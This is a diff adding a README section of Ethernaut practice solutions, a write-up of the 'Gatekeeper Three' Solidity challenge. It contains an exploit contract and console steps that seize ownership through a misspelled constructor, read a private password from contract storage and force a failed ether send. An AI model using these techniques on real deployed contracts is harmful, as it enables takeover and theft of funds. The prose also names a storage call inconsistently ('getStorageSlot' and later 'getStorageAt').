@@ -920,6 +920,137 @@ Here's our attacking contract:
 
 All you have to do is, copy the instance address of the `GoodSamaritan` contract and then deploy the `Attack` contract by passing the copied address as an argument and then call the `attack` function. That's it!
 
+## 28 - Gatekeeper Three
+
+For reference -> [Challenge](./questions/28.Gatekeeper_Three.sol) | [Solution](./answers/28.Gatekeeper%20Three/)
+
+Here's the third gatekeeper challenge, like the last ones our task to get through all three gates by calling the and this time it's quite easy and straight forward. Also, we got another contract with our main `GatekeeperThree` contract which is `SimpleTrick`. Will advice you to get read that contract carefully as I be mentioning parts from it like always and thus try not to get confused when I am naming the function to be talked about...Let's begin!
+
+We got our main contract i.e `GatekeeperThree`. Let's find the solution of tackling each modifier (or gates) which then be used in `enter` function.
+
+**GateOne:** Simple and straight like always, We have to use a different contract here in order to interact with `GatekeeperThree` as that will keep the msg.sender as owner and tx.origin as different than the owner. The first thing we gonna do in order to become the owner of `GatekeeperThree` is call it's `construct-1rr` (read it again). Yea, you got it probably...there's a type mistake which let's us call that faulty function and become the owner.
+
+```solidity
+    function construct0r() public {
+        owner = msg.sender;
+    }
+
+    modifier gateOne() {
+        require(msg.sender == owner);
+        require(tx.origin != owner);
+        _;
+    }
+```
+
+**GateTwo:** Here we need the boolean `allowEntrance` to be true. If you look at the `getAllowance` function, there's the way to make it true but it needs a password. Here `SimpleTrick` contract comes in hand. We are given a separate function `createTrick` to initialize our own `SimpleTrick` contract with our `GatekeeperThree` contract's address as the parameter which will point the `target` to our `GatekeeperThree` contract (look within the constructor of `SimpleTrick` contract). Additionally, `trickInit` is also called to initialize the `trick` variable with the address of the `SimpleTrick` contract.
+
+```solidity
+    modifier gateTwo() {
+        require(allowEntrance == true);
+        _;
+    }
+```
+
+```solidity
+    /// Functions related to GatekeeperThree contract
+
+    function getAllowance(uint _password) public {
+        if (trick.checkPassword(_password)) {
+            allowEntrance = true;
+        }
+    }
+
+    function createTrick() public {
+        trick = new SimpleTrick(payable(address(this)));
+        trick.trickInit();
+    }
+
+
+
+    /// Functions related to SimpleTrick contract
+
+    constructor (address payable _target) {
+        target = GatekeeperThree(_target);
+    }
+        
+    function checkPassword(uint _password) public returns (bool) {
+        if (_password == password) {
+        return true;
+        }
+        password = block.timestamp;
+        return false;
+    }
+        
+    function trickInit() public {
+        trick = address(this);
+    }
+        
+    function trickyTrick() public {
+        if (address(this) == msg.sender && address(this) != trick) {
+            target.getAllowance(password);
+        }
+    }
+```
+
+Now, we got to do something with that `SimpleTrick` contract we intialized. It got a private variable `password` with block.timestamp value and is on 3rd slot. So far, we are clear that `private` doesn't protect the secrets. Thus, using the code -> `await web3.eth.getStorageSlot(contract_address, 3, console.log)` within the browser's console will give us the password but in hexadecimals. But, we need it in `uint` format. You can get it either by converting that hexadecimals into decimal online or by using `parseInt` function in the console itself. Now, using the browser's console call the `getAllowance` function with the password (in uint) as the argument and we got our `allowEntrance` to be true.
+
+**GateThree:** The last gate contains a condition which requires the balance of the `GatekeeperThree` contract to be greater than 0.001 ether which is easy, and it also needs to make sure that the owner (i.e the contract we are using to call the `enter` function) ain't able to get 0.001 ether paid from the `GatekeeperThree` contract. If one knows the basic then he/she knows that in order to send ether to a contract it must consists of either a `receive` or `fallback` function. But our attacking contract won't be having both of them. Thus, the condition `payable(owner).send(0.001 ether) == false` will satifsy and we will be able to pass through the last gate.
+
+```solidity
+    modifier gateThree() {
+        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
+            _;
+        }
+    }
+```
+
+Here's our `Attack` contract which be using in order to solve this challenge:
+
+```solidity
+    // SPDX-License-Identifier: MIT
+    pragma solidity ^0.8.0;
+
+    interface GateKeeperThree{
+        function construct0r() external ;
+        function enter() external ;
+    }
+
+    contract Attack {
+        GateKeeperThree public target;
+
+        constructor(address victim){
+            target = GateKeeperThree(victim);
+        }
+
+        function beOwner() external{
+            target.construct0r();
+        }
+
+        function attack() external{
+            target.enter();
+        }
+    }
+```
+
+Now, let me follow through the exact steps you need to take in order to solve this challenge:
+
+1. Deploy the `Attack` contract by passing the instance address of the `GatekeeperThree` contract as an argument and call the `beOwner` function in order to become the owner. This will get us cleared through the first gate.
+
+2. Now we need to call the `createTrick` function using the browser's console which will initialize the `SimpleTrick` contract with the address of `GatekeeperThree` contract as an argument.
+
+3. Now, call the `trick` variable using `await contract.trick()` as trick is a variable which contains the address of SimpleTrick contract. Here we are talking about `SimpleTrick public trick` in `GatekeeperThree` contract, not the other one which is present in `SimpleTrick` contract.
+
+4. With that we will get an address in the console, thus store the address and then look for the password within the 3rd slot...Here it goes:
+
+```javascript
+    const addr = "your_trick_address"
+    await web3.eth.getStorageAt(addr, 3, console.log)
+```
+
+5. Now, convert the hexadecimals into decimal (uint) and then call the `getAllowance` function with the password as an argument using the browser's console. You can even check whether `allowEntrance` is true or not by calling `await contract.allowEntrance()`. This opens our gate Two.
+
+6. For the last gate, all you have to do is send some ether greater than 0.001 to the `GatekeeperThree` contract using `await contract.sendTransaction({value: 1100000000000000})` and the 2nd condition will be satisfied as we don't have a `receive` or `fallback` function in our attacking contract. Now, call the `attack` function and submit the instance...Cheers!
+
 ## Contributing
 
 Contributions to the Ethernaut_Practice project are welcome! If you have a solution to a challenge that is not yet included, or if you have suggestions for improvements, feel free to open a pull request.
